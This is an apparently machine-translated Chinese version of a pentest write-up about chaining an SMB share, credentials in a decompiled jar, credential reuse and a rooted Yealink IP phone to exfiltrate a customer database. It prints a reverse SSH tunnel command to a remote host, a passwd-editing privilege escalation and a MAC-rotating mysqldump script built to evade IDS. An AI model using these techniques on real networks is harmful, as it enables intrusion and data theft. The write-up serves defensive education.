<html>
<head>
<title>Chaining multiple vulnerabilities to exfiltrate over 250GB of PIA</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">链接多个漏洞，泄漏超过250GB的PIA</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chaining-multiple-vulnerabilities-to-exfiltrate-over-250gb-of-pia-2d624f030ed1?source=collection_archive---------0-----------------------#2020-08-10">https://infosecwriteups.com/chaining-multiple-vulnerabilities-to-exfiltrate-over-250gb-of-pia-2d624f030ed1?source=collection_archive---------0-----------------------#2020-08-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="938e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我们几年前做的一次内部测试的记录，涉及几个小漏洞，但让我们成功地泄露了大量信息。</p><p id="ef38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一切都是从我们所在的一个小型内部子网的Nmap扫描开始的。我们没有找到任何有希望的线索，除了一个暴露的SMB共享，这显然是一个开发人员在本地创建的，用于在计算机之间共享文件。扫描显示类似这样的东西。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/316136b850d579983689c093990cc68e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*yzFtIhqonaOWivqiaF7SvA.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">nmap扫描的部分结果</figcaption></figure><p id="d1ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们成功地用impacket的smbclient.py检查了访问。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kx"><img src="../Images/ede79aeebe340e66c770b4b3d6473794.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T4mMA4wjGYbi1V7a665AAQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">smbclient.py</figcaption></figure><p id="19d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找不到任何有用的明文信息或任何敏感数据。但是再看一眼，我们发现了一个有趣的文件:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lc"><img src="../Images/2e47a327157a80a8a105c1577859ad5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MvzfS-vEzPNSNMEEQryh3g.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">自定义jar文件</figcaption></figure><p id="d851" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这看起来像一个定制的jar文件。信息不会是纯文本的，但是我们继续用java-decompiler ( <code class="fe ld le lf lg b">https://github.com/java-decompiler/jd-gui.git).</code>)反编译文件</p><p id="0cda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们克隆了存储库，编译了所有内容，并在jar文件中运行它:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lh"><img src="../Images/0f49282da82747f55596b4415d84be16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M5iZvccn9l5xE3f32abj0g.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">开始构建</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi li"><img src="../Images/eabd376118698c268e4722ec79b9675c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a8RXgz_QCqTEjmsEWVSYyA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">打开结果文件</figcaption></figure><p id="dfc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，java-decompiler的窗口将会打开。此时，您唯一需要做的事情就是拖放您想要分析的编译好的jar文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/f23fb905fb8af38a878d50419facaa9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*MDGS3aNqOHzoxFC99Ht6vQ.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Java反编译程序</figcaption></figure><p id="faf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不打算上传完整源代码的截图，但我们确实在其中发现了一些有趣的信息:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lk"><img src="../Images/d3520eb54d2d5e752a9257878030a323.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P7hNmf9WZpkYE7vLkgYQfg.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">数据库连接密码的源代码</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi ll"><img src="../Images/e9278406bfc048a7d90187be124abfaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*21jRCxWGRcMgXfSI_FYC2g.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">源代码中的数据库连接细节</figcaption></figure><p id="03c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们兴奋地开始扫描那些IP。令我们失望的是，他们都倒下了，没有数据库被发现。我们开始对相邻子网进行全端口扫描，希望它们能够重复使用凭据。几个小时后，我们找到了运行在10.40.0.0/16子网的端口3033上的SQL server。</p><p id="a1d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通过重复使用凭据进行连接。令我们惊讶的是，我们发现了超过50个与业务相关的表，数据超过700GB(由于明显的原因而被删除)。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lm"><img src="../Images/333f6a3b63b1149421e0bf0fc0dd3d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2GI-IBICCYJbJzm3VfjuIA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">通过重复使用凭据危害数据库</figcaption></figure><p id="279e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了让您对找到的信息量有个概念，它们是大约1600万个客户电子邮件地址:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lm"><img src="../Images/83b18c66f086db1466eb0d8d4081abcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JBsWMLWcOXDISITC3ws-MQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">客户电子邮件地址</figcaption></figure><p id="4288" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在另一个表中，我们发现了另外1600万笔交易的记录，包括客户数据、电子邮件地址和购买细节。另一个表有超过20万条记录，记录了完整的信用卡号。</p><p id="ec98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一切都很棒(至少对我们来说)，但圣灵降临节并没有到此结束。我们需要一种方法来泄漏这些信息。在全部700GB的数据中，大约有270GB的可用关键数据。但是我们需要证明拥有临时访问权限的内部攻击者能够破解这个。DB服务器的硬件在运行查询方面非常出色，我们能够在不到几个小时的时间内分析大部分信息，但是当我们试图下载它时，我们确实受到了网络速度的限制。此外，每天向一台客户端计算机下载超过200GB的数据可能会触发一些NIDS规则，并警告他们存在危害。最后，这个共享只能从网络内部访问，这意味着我们需要一个类似反向ssh连接的东西，连接到一个公共的攻击者控制的服务器。</p><p id="c738" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我更好地解释这个ssh连接是如何工作的。通常，当您危害公司网络内部的设备时，您不能简单地启动该机器上的连接监听器。通常情况下，设备位于几个防火墙、NAT网络等之后。阻止你从外面进入。绕过这一点的最简单的方法之一是启动一个反向shell。这是因为连接来自内部，并到达您控制的外部服务器(通常允许出口流量，仅过滤入口流量)。但是这也有不太可靠的缺点。你不想要一个单一的连接，你想要一个类似服务/守护进程的东西，以防出现问题。此外，通过msfvenom生成的有效载荷不会像已经使用了很久的软件(类似ssh的东西)那样可靠。</p><p id="a02c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你要做的就是使用一种叫做ssh隧道的ssh功能。基本上，您生成一个到外部的ssh连接，如下所示:</p><pre class="km kn ko kp gt ln lg lo lp aw lq bi"><span id="7923" class="lr ls iq lg b gy lt lu l lv lw">ssh -R 8080:127.0.0.1:22 -N -f user@remote.host</span></pre><p id="673f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-N指定你不想运行任何命令，只需要建立一个连接，而-f是将进程发送到后台。这将在您可访问互联网的主机(remote.host)的端口8080上打开一个套接字。到该端口的任何连接都将被转发到受损机器的端口22(ssh)。因此，在连接到remote.host后，您只需:</p><pre class="km kn ko kp gt ln lg lo lp aw lq bi"><span id="79f7" class="lr ls iq lg b gy lt lu l lv lw">ssh -p 8080 compromiseduser@localhost</span></pre><p id="55c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你将能够从公司网络外部访问被入侵的机器。</p><p id="d811" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解释完这些，让我们继续进行pentest。我们决定，我们需要找到一台24/7开机、安全性差且能访问网络的设备。这当然意味着物联网设备。</p><p id="b753" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于那些不熟悉这个概念的人来说，物联网是技术人员指通常不需要互联网接入就能工作的设备的一种方式。但是他们把它作为一个特性，而且通常安全性很差。想想像Roombas、冰箱、咖啡机、电视等东西……(这个定义不是100%准确，你可以在<a class="ae lx" href="https://en.wikipedia.org/wiki/Internet_of_things" rel="noopener ugc nofollow" target="_blank">https://en.wikipedia.org/wiki/Internet_of_things</a>上阅读更多关于物联网的信息)</p><p id="1340" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">扫描网络时，我们发现超过100台设备可以被定义为物联网设备。有3个主要群体:闭路电视摄像机，电视和IP电话。电视不是全天候的，所以它们不会工作。这些手机都是Yealink的，经过简单的研究，我们发现了多种可用的漏洞。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/500445dba2a2c889180c6cb22c8bcb0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*xYj36bOS2mJR-XLO6Wt9GQ.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">我们找到的型号是yealink T20P。</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lz"><img src="../Images/d8be2c9a485bc5535a4835ad200bec5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N0lD_GWW4NYK5ksaPYuDuA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Yealink的可用漏洞</figcaption></figure><p id="d153" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在阅读了<a class="ae lx" href="https://www.exploit-db.com/exploits/23572" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/23572,</a>之后，我们学习了一种启用telnet服务器的方法。一个隐藏页面，位于<code class="fe ld le lf lg b">http://&lt;IP&gt;/cgi-bin/ConfigManApp.com?Id=10.</code></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi ma"><img src="../Images/6dc2ab66e6eea48b7285d50a40ae2bf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vPV3ZdB5LUiiqLIahoG9LA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Yealink管理网页。</figcaption></figure><p id="ae15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们能够使用默认凭证<strong class="jp ir"> admin:admin </strong>登录(物联网设备中的常见问题)。启用telnet服务器后，我们使用admin/admin登录电话，却发现admin用户与root用户不同。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi mb"><img src="../Images/e8d6d6659faf1e3a28cb991f8ea8027b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pR_KI4Ta8ENcEUjz9HJm7A.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">登录到telnet服务器的管理员</figcaption></figure><p id="24ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了连接到我们控制的公共实例，我们需要一个ssh连接。这意味着拥有对设备的根访问权限。大多数可用的利用都假设您可以打印影子文件，因此您拥有root访问权限，但是如果您看一看，就会发现每个人都拥有对影子文件的读取权限(不要问我们为什么要这样配置)。该设备没有我们正在寻找的ssh功能，所以我们必须安装新软件。这意味着我们需要root权限，并且只能是root权限。看到所有发现的漏洞，我们怀疑这个模型应该不是特别安全，我们发现了一个新的简单的权限提升。</p><p id="ab57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您看一下前面的图像，您可以看到shadow文件对所有人都是可读的，并且归root所有，但是passwd文件由于某种原因实际上归guest帐户所有(我们发誓这是默认配置)。所以您实际上可以作为guest:guest登录，并编辑passwd文件以绕过影子哈希检查(您只需要删除第二个字段中的“x ”,就可以不用密码登录了)。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi mc"><img src="../Images/2b0e74ee31679ef9048a3b7d0cf40e7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wwb73Ju7Fmlo2xj6fcXjZQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">根访问</figcaption></figure><p id="a56d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在找到电话的根之后，我们必须为这个特定的busybox发行版静态编译一个版本的dropbear(一个小型ssh服务器)。不幸的是，我无法再使用这部手机来重现这个过程，此外，这超出了本文的范围。这是一个漫长的过程，有很多尝试和错误。回想起来，如果让我再做一次，我可能会用考拉(<a class="ae lx" href="https://github.com/mrschyte/pentestkoala" rel="noopener ugc nofollow" target="_blank">https://github.com/mrschyte/pentestkoala</a>)这样的东西。</p><p id="2b38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当ssh服务器工作时，我们想出了一个简单的bash脚本来绕过可能的HIDS系统。我们不想用同一个IP下载所有不同的数据库，以防止超过可能的下载阈值。在用macchanger做了一个快速测试和手动DHCP释放之后，我们验证了我们分配的IP依赖于我们的mac地址。所以我们用这个脚本下载了数据库:</p><pre class="km kn ko kp gt ln lg lo lp aw lq bi"><span id="92de" class="lr ls iq lg b gy lt lu l lv lw">#!/bin/bash<br/>for i in importantdb1 importantdb2 importantdb3 importantdb4; do<br/> dhclient -r enp0s25<br/> sleep 10<br/> macchanger - random enp0s25<br/> dhclient enp0s25<br/> sleep 40<br/> mysqldump - verbose -u root -prootspi949 -h 10.40.59.10 -P 3033 $i &gt;&gt; /tmp/compromisedDb/$i.sql<br/>done</span></pre><p id="9203" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了安全起见，我们可能会在每个表下载中循环使用我们的IP地址，而不是在每个数据库中，但是这样做效果很好。</p><p id="a3e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回顾这次测试，我们开发了一个</p><ul class=""><li id="d144" class="md me iq jp b jq jr ju jv jy mf kc mg kg mh kk mi mj mk ml bi translated">公共中小企业股份</li><li id="dc50" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">未经混淆编译的二进制文件</li><li id="4026" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">凭证重用</li><li id="e8ea" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">默认密码</li><li id="4847" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">不安全的设备</li><li id="59b1" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">网络ids规则配置不正确</li><li id="f335" class="md me iq jp b jq mm ju mn jy mo kc mp kg mq kk mi mj mk ml bi translated">缺少网络认证(802.1x可以防止频繁的IP变更)</li></ul><p id="9295" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你单独看每一个，它们并不是你能找到的最严重的漏洞，但是把它们连接起来就可以完全妥协。希望这对你和我们一样有教育意义。</p></div></div>    
</body>
</html>